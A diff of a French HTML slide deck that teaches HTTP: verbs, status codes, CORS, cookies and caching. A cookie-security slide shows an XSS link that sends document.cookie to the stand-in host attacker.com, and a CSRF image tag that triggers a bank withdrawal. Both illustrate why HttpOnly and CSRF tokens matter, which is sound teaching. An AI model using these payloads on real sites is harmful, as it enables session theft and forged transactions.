@@ -1,31 +1,9 @@
 <!DOCTYPE html>
-<!-- Slides from Google (slides.html5rocks.com) cleaned up for new presentations
-Copyright 2011 Google Inc.
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-
-Original slides: Marcin Wichary (mwichary@google.com)
-Modifications: Chrome DevRel Team (chrome-devrel@googlegroups.com)
-Alex Russell (slightlyoff@chromium.org)
-Brad Neuberg
--->
-<html manifest="cache.appcache">
+<html>
     <head>
         <meta charset="utf-8" />
         <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1" />
         <title>Présentation de HTTP</title>
-        <link href="http://fonts.googleapis.com/css?family=Droid+Sans|Droid+Sans+Mono" rel="stylesheet" type="text/css" />
-        <link id="prettify-link" href="src/prettify/prettify.css" rel="stylesheet" disabled />
         <link href="css/moon.css" class="theme" rel="stylesheet" />
         <link href="css/sand.css" class="theme" rel="stylesheet" />
         <link href="css/sea_wave.css" class="theme" rel="stylesheet" />
@@ -49,7 +27,7 @@ Brad Neuberg
             <div id="presentation-counter">Loading...</div>
             <div class="slides">
                 <div class="slide" id="landing-slide">
-                    <style scoped>
+                    <style>
                         #landing-slide p { font-size: 35px; }
                         p#disclaimer-message { font-size: 20px; }
                     </style>
@@ -59,23 +37,8 @@ Brad Neuberg
                     </section>
                 </div>
 
-                <div class="slide" id="controls-slide">
-                    <style scoped>
-                        #controls-slide li, #controls-slide p { font-size: 35px; }
-                    </style>
-                    <section>
-                    <p>Contrôles :</p>
-                    <ul>
-                        <li><span class="key">&larr;</span> et <span class="key">&rarr;</span> pour vous déplacer.</li>
-                        <li><span class="key">Ctrl/Command</span> et <span class="key">+</span> ou <span class="key">-</span> pour zoomer.</li>
-                        <li><span class="key">T</span> pour changer le thème.</li>
-                        <li><span class="key">H</span> pour changer le surlignage de la syntaxe.</li>
-                    </ul>
-                    </section>
-                </div>
-
                 <div class="slide" id="title-slide">
-                    <style scoped>
+                    <style>
                         #title-slide h1, #title-slide h2 { color: black; }
                         #title-slide h1 { letter-spacing: -2px; font-size: 70px; }
                         #title-slide h2 { margin-top: 1em; font-size: 36px; color: #665544; }
@@ -83,35 +46,68 @@ Brad Neuberg
                     <section class="middle">
                     <hgroup>
                     <h1>HTTP</h1>
-                    <h2>Hypertext Transfer Protocol</h2>
                     <h2>HyperText Transfer Protocol</h2>
-                    <h3>Grégory Paul - <a href="http://paulgreg.me" title="Portfolio">paulgreg.me</a></h3>
-                    <a href="http://www.valtech.fr/" title="Se rendre sur le site de Valtech France"><img src="imgs/valtech-logo.png" title="" alt="valtech_"></a>
+                    <h3>Grégory Paul - <a href="https://paulgreg.me" title="Portfolio">paulgreg.me</a></h3>
                     </hgroup>
                     </section>
                 </div>
 
+                <div class="slide" id="about">
+                    <style>
+                    #about ul                                    { display: inline-block; width: 45%;  }
+                    #about ul.next                               { float: right;}
+                    #about .logo                                 { width: 200px; }
+                    #about .mappy-home,
+                    #about .mappy-immersive                      { width: 430px; position: absolute; top: 340px; border: 1px solid black }
+                    #about .mappy-home                           { left: 10px; }
+                    #about .mappy-immersive                      { left: 450px; }
+                    </style>
+                    <section>
+                    <h2>Présentation</h2>
+                    <ul>
+                        <li>Grégory Paul
+                        <li>Développeur Web<br>
+                            (<a href="https://twitter.com/search?q=%23javascript%20from%3Apaulgreg&src=typd">JavaScript</a>,
+                            <a href="https://twitter.com/search?q=%23security%20from%3Apaulgreg&src=typd">sécurité</a>,
+                            <a href="https://twitter.com/search?q=%23diy%20from%3Apaulgreg&src=typd">hack/DIY</a>)
+                        <li><a href="https://twitter.com/paulgreg" rel="me">@paulgreg</a>,
+                            <a href="https://paulgreg.me/" rel="me">https://paulgreg.me</a>
+                    </ul>
+                    <ul class="next">
+                        <li><img alt="Mappy" src="imgs/mappy-logo.png" class="logo" />
+                        <li>
+                            <a href="https://fr.mappy.com/">cartes</a>, <a href="https://fr.mappy.com/itineraire">itinéraires</a>,
+                            <a href="https://fr.mappy.com/#/720/M1/THome/N-397.03335,1,2.29203,48.8608/Z15/">vues immersives</a> <small>(en <a href="http://techblog.mappy.com/vues-360-en-webgl.html">webGL</a>)</small>,
+                            <a href="https://fr.mappy.com/poi/5190c34184ae2d329f8f47ed">~4 500 000 <abbr title="Point Of Interest">POI</abbr></a>,
+                            <a href="https://shopping.mappy.com/">web2store</a>
+                        <li>~ 1 000 000 visites par jour
+                        <img class="mappy-home" alt="" src="imgs/mappy-home.png" />
+                        <img class="mappy-immersive" alt="" src="imgs/mappy-immersive.png" />
+                    </ul>
+                    </section>
+                </div>
+
                 <div class="slide" id="summary-slide">
-                    <style scoped>
+                    <style>
                         #summary-slide ol { column-count: 2; }
                     </style>
                     <section>
                     <h2>Sommaire</h2>
                     <ol>
                         <li>Vue d’ensemble
-                        <li>La petite histoire...
+                        <li>La petite histoire
                         <li>Versions 0.9, 1.0. 1.1
                         <li>URI, URL, URN
                         <li>Verbes
                         <li>Codes de retour
-                        <li>Cookies
                         <li>Négociation de contenu
                         <li>Plage de réponse et réponse partielle
+                        <li>Same Origin Policy, Cross-Origin Resource Sharing (CORS)
+                        <li>Cookies
                         <li>Cache
                         <li>Authentification
-                        <li>SSL/TLS
                         <li>Extensions (WebDAV,...)
-                        <li>SPDY et HTTP 2.0
+                        <li>HTTP 2.0
                         <li>Outils
                     </ol>
                     </section>
@@ -137,35 +133,38 @@ Brad Neuberg
                 <div class="slide" id="overview-example-slide">
                     <section>
                     <h2>HTTP à la main</h2>
-                    <pre>➜  ~  ping www.google.fr
-PING www.google.fr (74.125.230.247) 56(84) bytes of data.
-...
-^C
-➜  ~  telnet 74.125.230.247 80
-Trying 74.125.230.247...
-Connected to 74.125.230.247.
+                    <pre>
+➜  ~ host neverssl.com
+<strong>neverssl.com</strong> has address <strong>52.85.74.244</strong>
+</pre>
+<pre>
+➜  ~ telnet 52.85.74.244 80
+Trying 52.85.74.244...
+Connected to 52.85.74.244.
 Escape character is '^]'.
-GET / HTTP/1.1
-Host: www.google.fr
+<strong>GET / HTTP/1.1
+Host: neverssl.com
 
-HTTP/1.1 200 OK
-Date: Fri, 02 Dec 2011 15:03:11 GMT
-Expires: -1
-Cache-Control: private, max-age=0
-Content-Type: text/html; charset=ISO-8859-1
-Content-Length: 4386
-Set-Cookie: ...
-Server: gws
+HTTP/1.1 200 OK</strong>
+Content-Type: text/html
+Content-Length: 2536
+Connection: keep-alive
+Date: Sat, 18 Aug 2018 21:13:03 GMT
+Last-Modified: Thu, 14 Jun 2018 00:16:40 GMT
+ETag: "e8bb9152091d61caa9d69fed8c4aebc6"
+Accept-Ranges: bytes
+Server: AmazonS3
+Vary: Accept-Encoding
+Age: 58125
+X-Cache: Hit from cloudfront
+Via: 1.1 5db82aafd9021b07695423274288b59e.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: I7YUe8nDTtm1o21NKrXIbTPUsvs9zDD7hHhbHFYDiVP--9UBfqX4kw==
 
-&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;...</pre>
+<strong>&lt;html&gt;</strong>...
+</pre>
               </section>
           </div>
-          <div class="slide" id="overview-live-http-headers-example-slide">
-              <section>
-              <h2>Avec des outils : <a href="http://livehttpheaders.mozdev.org/">Live HTTP Headers</a> ou <a href="https://addons.mozilla.org/en-US/firefox/addon/httpfox/">HttpFox</a></h2>
-              <p><img src="imgs/livehttpheaders.png" style="border:1px solid black; width: 800px;" alt="LiveHTTPHeaders" title="LiveHTTPHeadesr" /></p>
-              </section>
-          </div>
+
           <div class="slide" id="request-diagram-slide">
               <section>
               <h2>Séquence</h2>
@@ -190,10 +189,11 @@ Server: gws
                   <li>En 1993, le <abbr title="National Center for Supercomputing Applications">NCSA</abbr> créé <a href="ftp://ftp.ncsa.uiuc.edu/Mosaic/">Mosaic</a> et <a href="http://httpd.apache.org/ABOUT_APACHE.html">HTTPd</a>
                   <li>En 1996, <a href="http://tools.ietf.org/html/rfc1945"><abbr title="Request for comment">RFC</abbr> 1945</a> : HTTP/1.0
                   <li>En 1997, <a href="http://tools.ietf.org/html/rfc2068">RFC 2068</a> : HTTP/1.1
-                  <li>En 2000, <a href="http://www.ics.uci.edu/~fielding/">Roy Fielding</a> publie sa thèse <a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm">Architectural Styles and the Design of Network-based Software Architectures</a><br>(<a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm"><abbr title="Representational state transfer">REST</abbr></a>)
+                  <li>En 2000, <a href="http://www.ics.uci.edu/~fielding/">Roy Fielding</a> publie sa thèse <a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm">Architectural Styles and the Design of Network-based Software Architectures</a>
+                      (<a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm"><abbr title="Representational state transfer">REST</abbr></a>)
                   <li><a href="http://www.w3.org/Protocols/">19 révisions</a> de HTTP/1.1 entre 2007 et 2012,
                   <li>En 2009, Google <a href="http://googleresearch.blogspot.com/2009/11/2x-faster-web.html">propose</a> <a href="http://www.chromium.org/spdy">SPDY</a>,
-                  <li>En 2012, le groupe de travail <a href="https://tools.ietf.org/wg/httpbis/">httpbis</a> de l’<a href="https://ietf.org/"><abbr title="Internet Engineering Task Force">IETF</abbr></a> planche sur HTTP 2.0
+                  <li>En 2015, standardisation de HTTP/2 (h2) par l’<a href="https://ietf.org/"><abbr title="Internet Engineering Task Force">IETF</abbr></a> dans la <a href="https://tools.ietf.org/html/rfc7540"><abbr title="Request For Comment">RFC</abbr> 7540</a>
               </ul>
               </section>
           </div>
@@ -212,8 +212,8 @@ Server: gws
               <p>une <abbr title="Uniform Resource Name">URN</abbr> identifie et nomme.</p>
               <h3>URLs :</h3>
               <ul>
-                  <li>mailto:someone@example.com
                   <li>http://www.damnhandy.com/
+                  <li>mailto:someone@example.com
                   <li>file:///home/someuser/somefile.txt
               </ul>
               <h3>URNs :</h3>
@@ -222,9 +222,10 @@ Server: gws
                   <li>urn:sha1:YNCKHTQCWBTRNJIV4WNAE52SJUQCZO5C
                   <li>urn:uuid:6e8bc430-9c3a-11d9-9669-0800200c9a66
               </ul>
+              <h3>Et n’oubliez pas</h3>
+              « <a href="https://www.w3.org/Provider/Style/URI">Cool URIs don’t change</a> » (depuis 1998)
               </section>
           </div>
-
 
           <div class="slide" id="versions-details-title-slide">
               <section class="middle">
@@ -260,6 +261,9 @@ Server: gws
               </section>
           </div>
           <div class="slide" id="http-1-1-slide">
+              <style>
+                #http-1-1-slide img { margin-left: .1em }
+              </style>
               <section>
               <h2>HTTP 1.1</h2>
               <ul>
@@ -281,7 +285,7 @@ Server: gws
               </section>
           </div>
           <div class="slide" id="verbs-slide">
-              <style scoped>
+              <style>
                   #verbs-slide .used span { font-weight: bold; }
                   #verbs-slide span:after { color: #654; margin-left: .5em;  font-size: .7em; vertical-align: super; font-weight: normal;  }
                   #verbs-slide .idempotent span:after { content: "idempotent"; }
@@ -296,7 +300,7 @@ Server: gws
                   <li class="idempotent used"><span>PUT</span> : création d’une ressource
                   <li class="idempotent used"><span>DELETE</span> : suppression d’une ressource
                   <li class="safe idempotent"><span>TRACE</span> : echo de la requête
-                  <li class="safe idempotent"><span>OPTIONS</span> : Capacités du serveur
+                  <li class="safe idempotent"><span>OPTIONS</span> : informations complémentaires sur la resource
                   <li class=""><span>CONNECT</span> : SSL/TLS pour les proxies
                   <li class=""><span>PATCH</span> : modification partielle <small>(<a href="https://tools.ietf.org/html/rfc5789">RFC 5789</a>, mai 2010)</small>
               </ul>
@@ -309,7 +313,7 @@ Server: gws
               </section>
           </div>
           <div class="slide" id="status-code-slide">
-              <style scoped>
+              <style>
                   #status-code-slide ul > li > ul {
                       max-height: 90px; overflow-y: auto;border: 1px dotted #654;
                       font-size: 10px; column-count: 2;
@@ -319,13 +323,13 @@ Server: gws
               <section>
               <h2><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html">Codes de retour</a></h2>
               <ul>
-                  <li class="100">1xx Informational (3)
+                  <li class="100">1xx Informational
                   <ul>
                       <li>100 Continue
                       <li>101 Switching Protocols
                       <li>102 Processing (<a href="/wiki/WebDAV" title="WebDAV">WebDAV</a>; RFC 2518)
                   </ul>
-                  <li class="200">2xx Success (10)
+                  <li class="200">2xx Success
                   <ul>
                       <li>200 OK
                       <li>201 Created
@@ -338,7 +342,7 @@ Server: gws
                       <li>208 Already Reported (WebDAV; RFC 5842)
                       <li>226 IM Used (RFC 3229)
                   </ul>
-                  <li class="300">3xx Redirection (9)
+                  <li class="300">3xx Redirection
                   <ul>
                       <li>300 Multiple Choices
                       <li><a href="https://en.wikipedia.org/wiki/HTTP_301" title="HTTP 301">301 Moved Permanently</a>
@@ -350,7 +354,7 @@ Server: gws
                       <li>307 Temporary Redirect (since HTTP/1.1)
                       <li>308 Permanent Redirect (approved as experimental)
                   </ul>
-                  <li class="400">4xx Client Error (38)
+                  <li class="400">4xx Client Error
                   <ul>
                       <li>400 Bad Request
                       <li>401 Unauthorized
@@ -391,7 +395,7 @@ Server: gws
                       <li>497 HTTP to HTTPS (Nginx)
                       <li>499 Client Closed Request (Nginx)
                   </ul>
-                  <li class="500">5xx Server Error (14)
+                  <li class="500">5xx Server Error
                   <ul>
                       <li>500 Internal Server Error
                       <li>501 Not Implemented
@@ -412,6 +416,181 @@ Server: gws
               </section>
           </div>
 
+          <div class="slide" id="content-negociation-title-slide">
+              <section class="middle">
+              <h2>Négociation de contenu</h2>
+              </section>
+          </div>
+          <div class="slide" id="content-negociation-basics-slide">
+              <section>
+              <h2>Négociation de contenu</h2>
+              <h3>Navigateur demandant une page web</h3>
+<pre class="client">GET / HTTP/1.1
+Host: www.exemple.org
+<strong>Accept: text/html; q=1.0, text/*; q=0.8, image/gif; q=0.6, image/jpeg; q=0.6, image/*; q=0.5, */*; q=0.1
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Language: fr-FR; q=1.0, en; q=0.5</strong>
+... </pre>
+<pre class="server">HTTP/1.1 200 OK
+<strong>Content-Encoding: gzip
+Content-Length: 25719
+Content-type: text/html; charset=UTF-8
+Content-Language: en-US</strong>
+...</pre>
+<p><code>q</code> est un « facteur de qualité relatif » (priorité), cf <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html">RFC2616</a>.
+            </section>
+        </div>
+
+          <div class="slide" id="content-negociation-slide">
+              <section>
+              <h2>Négociation de contenu</h2>
+              <h3>Client d’API REST</h3>
+<pre class="client">GET /shops/all/address HTTP/1.1
+Host: www.exemple.org
+<strong>Accept: application/json; q=1.0, text/xml; q=0.8
+Accept-Charset: ISO-8859-1,utf-8; q=0.7, *; q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Language: fr-FR; q=1.0, en; q=0.5</strong>
+... </pre>
+<pre class="server">HTTP/1.1 200 OK
+Content-Encoding: gzip
+Content-Length: 25719
+<strong>Content-type: application/json; charset=utf-8
+Content-Language: en-US</strong>
+ ...</pre>
+              </section>
+          </div>
+
+          <div class="slide" id="partial-request-title-slide">
+              <section class="middle">
+              <h2>Requête et réponse partielle</h2>
+              </section>
+          </div>
+          <div class="slide" id="partial-request-slide">
+              <section>
+              <h2>Requête et réponse partielle</h2>
+<pre class="client"><strong>HEAD /2390/2253727548_a413c88ab3_s.jpg HTTP/1.1</strong>
+Host: farm3.static.flickr.com</pre>
+<pre class="server">HTTP/1.0 200 OK
+Date: Mon, 05 May 2008 00:33:14 GMT
+Server: Apache/2.0.52 (Red Hat)
+Accept-Ranges: bytes
+<strong>Content-Length: 3980</strong>
+Content-Type: image/jpeg</pre>
+<pre class="client">GET /2390/2253727548_a413c88ab3_s.jpg HTTP/1.1
+Host: farm3.static.flickr.com
+<strong>Range: bytes=0-999</strong></pre>
+<pre class="server"><strong>HTTP/1.0 206 Partial Content</strong>
+Date: Mon, 05 May 2008 00:36:57 GMT
+Server: Apache/2.0.52 (Red Hat)
+Accept-Ranges: bytes
+<strong>Content-Length: 1000
+Content-Range: bytes 0-999/3980</strong>
+Content-Type: image/jpeg
+...</pre>
+<p>Utilisé pour reprendre les téléchargements ou pour les médias (audio, vidéo)</strong>
+              </section>
+          </div>
+
+          <div class="slide" id="sop-title-slide">
+              <section class="middle">
+              <h2>Same Origin Policy</h2>
+              </section>
+          </div>
+
+          <div class="slide" id="sop-slide">
+              <style>
+                #sop-slide table td { border-bottom: 1px dashed black; padding: .1em .25em; }
+                #sop-slide .ok { background:#9F9; vertical-align:middle;text-align:center; }
+                #sop-slide .ko { background:#F99; vertical-align:middle;text-align:center; }
+              </style>
+              <section>
+              <h2>Same Origin Policy</h2>
+              <p>Mécanisme des navigateurs qui restreint l’interaction d’un script JS en fonction de son origine (appel Ajax, cookie, localStorage, IndexedDB).</p>
+              <h3>Origine ?</h3>
+              <table>
+                  <tr><th>URL</th><th>Outcome</th><th>Reason</th></tr>
+                  <tr><td><b>http://www.example.com</b>/</td><td class="ok">OK</td><td>Same protocol, host and port</td></tr>
+                  <tr><td><b>http://www.example.com</b>/other.html</td><td class="ok">OK</td><td>Same protocol, host and port</td></tr>
+                  <tr><td><b>http://</b>user:password@<b>www.example.com</b>/</td><td class="ok">OK</td><td>Same protocol, host and port</td></tr>
+                  <tr><td>http://www.example.com:<b>81</b>/</td><td class="ko">KO</td><td>Different port</td></tr>
+                  <tr><td><b>https</b>://www.example.com/</td><td class="ko">KO</td><td>Different protocol</td></tr>
+                  <tr><td>http://<b>en.example.com</b>/</td><td class="ko">KO</td><td>Different host</td></tr>
+                  <tr><td>http://<b>example.com</b>/</td><td class="ko">KO</td><td>Different host</td></tr>
+                  <tr><td>http://<b>v2.www.example.com</b>/</td><td class="ko">KO</td><td>Different host</td></tr>
+              </table>
+              <h3>Comment faire un appel Ajax sur un autre domaine ?</h3>
+              <p>Avec CORS</p>
+              </section>
+          </div>
+
+          <div class="slide" id="cors-title-slide">
+              <section class="middle">
+              <h2>Cross-Origin Resource Sharing</h2>
+              </section>
+          </div>
+
+          <div class="slide" id="cors-simple-slide">
+              <section>
+              <h2>Cross-Origin Resource Sharing</h2>
+              <h3>Requêtes simples</h3>
+              <p>GET, HEAD, POST sous <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/CORS#Requ%C3%AAtes_simples">certaines conditions</a></p>
+              <p>Depuis <i>example.org/index.html</i>, je souhaite appeler <i>service.com/file.json</i></p>
+<pre class="client">GET /file.json HTTP/1.1
+Host: service.com
+Accept: text/html;q=0.9,*/*;q=0.8
+Referer: http://example.org/index.html
+<strong>Origin: http://example.org</strong></pre>
+<pre class="server">HTTP/1.1 200 OK
+<strong>Access-Control-Allow-Origin: http://example.org</strong>
+Content-Type: application/json
+
+[json data]</pre>
+              <p>Sans l’entête <acode>Access-Control-Allow-Origin</code>, le navigateur bloquera le contenu.</p>
+              </section>
+          </div>
+
+          <div class="slide" id="cors-complex-1-slide">
+              <section>
+              <h2>Cross-Origin Resource Sharing</h2>
+              <h3>Requêtes complexes nécessitant une requête préliminaire (preflight)</h3>
+              <p>PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH ou <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/CORS#Requ%C3%AAtes_n%C3%A9cessitant_une_requ%C3%AAte_pr%C3%A9liminaire">si certains entêtes/valeurs</a></p>
+              <p>Le navigateur envoie une requête préliminaire (preflight)</p>
+<pre class="client">OPTIONS /resource/ HTTP/1.1
+Host: service.com
+Referer: http://example.org/form.html
+<strong>Origin: http://example.org
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: X-PINGOTHER, Content-Type</strong></pre>
+<pre class="server">HTTP/1.1 200 OK
+<strong>Access-Control-Allow-Origin: http://example.org
+Access-Control-Allow-Methods: PUT, GET
+Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+Access-Control-Max-Age: 86400</strong>
+Content-Length: 0</pre>
+<p>Le serveur autorise le verbe PUT et les entêtes spéciaux, le navigateur envoie alors la vraie requête</p>
+              </section>
+          </div>
+          <div class="slide" id="cors-complex-2-slide">
+              <section>
+              <h2>Cross-Origin Resource Sharing</h2>
+<pre class="client">
+PUT /resource/ HTTP/1.1
+Host: service.com
+Referer: http://example.org/form.html
+<strong>Origin: http://example.org
+X-PINGOTHER: pingpong
+Content-Type: text/xml; charset=UTF-8</strong>
+Content-Length: 10
+
+[body data]</pre>
+<pre class="server">
+HTTP/1.1 200 OK
+<strong>Access-Control-Allow-Origin: http://example.org</strong></pre>
+              </section>
+          </div>
+
           <div class="slide" id="cookie-title-slide">
               <section class="middle">
               <h2>Les Cookies</h2>
@@ -421,17 +600,18 @@ Server: gws
           <div class="slide" id="cookie-example-slide">
               <section>
               <h2>Les Cookies : exemple</h2>
-<pre class="client">GET / HTTP/1.1
+<pre class="client"><strong>GET / HTTP/1.1</strong>
 Host: www.exemple.org
 ...</pre>
-<pre class="server">HTTP/1.1 200 OK
+<pre class="server"><strong>HTTP/1.1 200 OK</strong>
 Content-type: text/html
-Set-Cookie: name=value
+<strong>Set-Cookie: name=value</strong>
 ...</pre>
-<pre class="client">GET /page.html HTTP/1.1
+<pre class="client"><strong>GET /page.html HTTP/1.1</strong>
 Host: www.exemple.org
-Cookie: name=value
+<strong>Cookie: name=value</strong>
 ...</pre>
+Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               </section>
           </div>
 
@@ -439,15 +619,13 @@ Cookie: name=value
               <section>
               <h2>Les Cookies</h2>
               <ul>
-                  <li>Défini pour un nom de domaine complet par défaut <small>(www.domain.com)</small>
+                  <li>Défini pour un nom de domaine <small>(www.domain.com)</small>
                   <li>limité à 20 cookies par domaine, d’environ 4000 caractères
-                  <li>Envoyé à chaque requête <small>(html, JS, Ajax, images, etc)</small>
-                  <li>Cookie = contenu personalisé = pas de cache
+                  <li>Envoyé à chaque requête sur le domaine du cookie <small>(html, JS, Ajax, images, etc)</small>
+                  <li>Cookie = contenu personalisé = pas de cache intermédiaire
                   <li>D’où l’intérêt de servir les ressources communes <small>(images, css, js)</small> depuis un autre sous-domaine <small>(static.domain.com)</small>
-                  <li>Cookie de session
-                  <li>Cookie chiffré
-                  <li>Entête <a href="https://fr.wikipedia.org/wiki/P3P"><abbr title="Platform for Privacy Preferences">P3P</abbr></a>
-                  <li>Entête <a href="https://fr.wikipedia.org/wiki/Do_Not_Track"><abbr title="Do Not Track">DNT</abbr></a>
+                  <li>Cookie de session (jusqu’à fermeture du navigateur) vs persistant
+                  <li>Cookie chiffré (contenu chiffré par le serveur)
               </ul>
               </section>
           </div>
@@ -470,107 +648,41 @@ Cookie: name=value
                   <li>un nom de domaine <small>(pour permettre le "cross-subdomain")</small>,
                   <li>un chemin,
                   <li>date d'expiration <small>(sans, le cookie est supprimé lorsque le navigateur est fermé)</small>,
-                  <li>type de connexion prévu <small>(chiffrée ou non)</small>,
-                  <li>type d’accès <small>(HTTP seul ou aussi via JS)</small>.
+                  <li>Flag <strong>secure</strong> (non transmis sans TLS)
+                  <li>Flag <strong>HttpOnly</strong> (invisible pour JavaScript)
               </ul>
               <h3>Exemples</h3>
-<pre class="server">Set-Cookie: LSID=DQAAAK…Eaem_vYg; Domain=docs.foo.com; Path=/accounts; Expires=Wed, 13-Jan-2021 22:23:01 GMT; Secure; HttpOnly</pre>
-<pre class="server">Set-Cookie: HSID=AYQEVn….DKrdst; Domain=.foo.com; Path=/; Expires=Wed, 13-Jan-2021 22:23:01 GMT; HttpOnly</pre>
-<pre class="server">Set-Cookie: SSID=Ap4P….GTEq; Domain=.foo.com; Path=/; Expires=Wed, 13-Jan-2021 22:23:01 GMT; Secure; HttpOnly</pre>
-
-              </section>
-          </div>
-          <div class="slide" id="cookie-security-demo-slide">
-              <section class="middle">
-              <h2>Les Cookies : Sécurité</h2>
+              <pre class="server">Set-Cookie: LSID=DQA…mvYg; Domain=docs.foo.com; Path=/accounts; Expires=Wed, 13-Jan-2021 22:23:01 GMT; Secure; HttpOnly</pre>
+              <pre class="server">Set-Cookie: HSID=AYQ…rdst; Domain=.foo.com; Path=/; Expires=Wed, 13-Jan-2021 22:23:01 GMT; HttpOnly</pre>
+              <p><strong>secure</strong> et <strong>HttpOnly</strong> sont très important contre le vol de cookie.</p>
               </section>
           </div>
           <div class="slide" id="cookie-security-slide">
               <section>
               <h2>Vol de cookie (cookie hijacking)</h2>
               <h3>À la main</h3>
-              <p>Démo sur <a href="http://blog.valtech.fr/wp-login">blog.valtech.fr</a> avec <a href="http://livehttpheaders.mozdev.org/">LiveHTTPHeaders</a> et telnet</p>
-              <h3>Via Firesheep</h3>
+              <p>il suffit de récupèrer le cookie et le « copier » dans son navigateur. <small>Certains services vérifient l’IP ou l’user-agent pour détecter ce genre de manipulation et bloque la connexion.</small></p>
+              <h3>Via Firesheep (2010)</h3>
               <p><a href="http://codebutler.com/firesheep?c=1"><img src="imgs/firesheep.png" alt="Firesheep" title="Firesheep" /></a></p>
-              <h2>Forge de cookie</h2>
+              <p>D’où le passage à HTTPS et le flag <i>secure</i>.</p>
               </section>
           </div>
-
-          <div class="slide" id="content-negociation-title-slide">
-              <section class="middle">
-              <h2>Négociation de contenu</h2>
-              </section>
-          </div>
-          <div class="slide" id="content-negociation-basics-slide">
+          <div class="slide" id="cookie-security-2-slide">
               <section>
-              <h2>Négociation de contenu</h2>
-              <h3>Navigateur demandant une page web</h3>
-<pre class="client">GET / HTTP/1.1
-Host: www.exemple.org
-Accept: text/html; q=1.0, text/*; q=0.8, image/gif; q=0.6, image/jpeg; q=0.6, image/*; q=0.5, */*; q=0.1
-Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
-Accept-Encoding: gzip,deflate
-Accept-Language: fr-FR; q=1.0, en; q=0.5
-... </pre>
-<pre class="server">HTTP/1.1 200 OK
-Content-Encoding: gzip
-Content-Length: 25719
-Content-type: text/html; charset=UTF-8
-Content-Language: en-US
-...</pre>
-            </section>
-        </div>
-
-          <div class="slide" id="content-negociation-slide">
-              <section>
-              <h2>Négociation de contenu</h2>
-              <h3>Client d’API REST</h3>
-<pre class="client">GET /shops/all/address HTTP/1.1
-Host: www.exemple.org
-Accept: application/json; q=1.0, text/xml; q=0.8
-Accept-Charset: ISO-8859-1,utf-8; q=0.7, *; q=0.3
-Accept-Encoding: gzip,deflate
-Accept-Language: fr-FR; q=1.0, en; q=0.5
-... </pre>
-<pre class="server">HTTP/1.1 200 OK
-Content-Encoding: gzip
-Content-Length: 25719
-Content-type: application/json; charset=utf-8
-Content-Language: en-US
- ...</pre>
+              <h2>Vol de cookie (cookie hijacking)</h2>
+              <h3>Cross-Site Scripting (XSS)</h3>
+              <p>Un attaquant poste cela sur un site :</p>
+              <pre>&lt;a href="#"
+  onclick="window.location='//attacker.com/?cookie='+escape(document.cookie);
+  return false;"&gt;Click here!&lt;/a&gt;</pre>
+              <p>D’où l’intérêt du flag <i>HttpOnly</i>.</p>
+              <h3>Cross-Site Request Forgery (CSRF)</h3>
+              <p>Un attaquant poste cela sur un site :</p>
+              <pre>&lt;img src="//bank.com/withdraw?amount=100&amp;for=attacker"&gt;</pre>
+              <p>Pour l’éviter, le serveur doit envoyer un jeton unique et aléatoire avant chaque requête « importante ». Le client doit obligatoirement le retransmettre dans la requête suivante.</p>
+              <p>Il faut également éviter d’utiliser <code>*</code> dans vos entêtes <abbr title="Cross Origin Ressource Sharing">CORS</abbr>.</p>
               </section>
           </div>
-
-          <div class="slide" id="partial-request-title-slide">
-              <section class="middle">
-              <h2>Requête et réponse partielle</h2>
-              </section>
-          </div>
-          <div class="slide" id="partial-request-slide">
-              <section>
-              <h2>Requête et réponse partielle</h2>
-<pre class="client">HEAD /2390/2253727548_a413c88ab3_s.jpg HTTP/1.1
-Host: farm3.static.flickr.com</pre>
-<pre class="server">HTTP/1.0 200 OK
-Date: Mon, 05 May 2008 00:33:14 GMT
-Server: Apache/2.0.52 (Red Hat)
-Accept-Ranges: bytes
-Content-Length: 3980
-Content-Type: image/jpeg</pre>
-<pre class="client">GET /2390/2253727548_a413c88ab3_s.jpg HTTP/1.1
-Host: farm3.static.flickr.com
-Range: bytes=0-999</pre>
-<pre class="server">HTTP/1.0 206 Partial Content
-Date: Mon, 05 May 2008 00:36:57 GMT
-Server: Apache/2.0.52 (Red Hat)
-Accept-Ranges: bytes
-Content-Length: 1000
-Content-Range: bytes 0-999/3980
-Content-Type: image/jpeg
-...</pre>
-              </section>
-          </div>
-
           <div class="slide" id="cache-title-slide">
               <section class="middle">
               <h2>Cache</h2>
@@ -593,25 +705,25 @@ Content-Type: image/jpeg
                   <li>Navigateur / Client
                   <li>Proxy <small>(squid, équipement réseau/"network appliance")</small>
                   <li>Reverse-proxy <small>(squid, varnish, etc)</small>
-                  <li><abbr title="Content Delivery Network">CDN</abbr> <small>(Akamai, Amazon Cloud Front, ...)</small>
+                  <li><abbr title="Content Delivery Network">CDN</abbr> <small>(CloudFlare, Amazon Cloud Front, Akamai,...)</small>
               </ul>
               <h3>2 types :</h3>
               <ul>
-                  <li>Cache privé
-                  <li>Cache public
+                  <li>Cache privé (client final tel qu’un navigateur)
+                  <li>Cache public (intermédaire tel qu’un proxy)
               </ul>
               <h3>Définitions :</h3>
               <ul>
-                  <li>Revalidation
                   <li>Cache hit
                   <li>Cache miss
+                  <li>Revalidation
               </ul>
               </section>
           </div>
           <div class="slide" id="cache-date-expires-slide">
               <section>
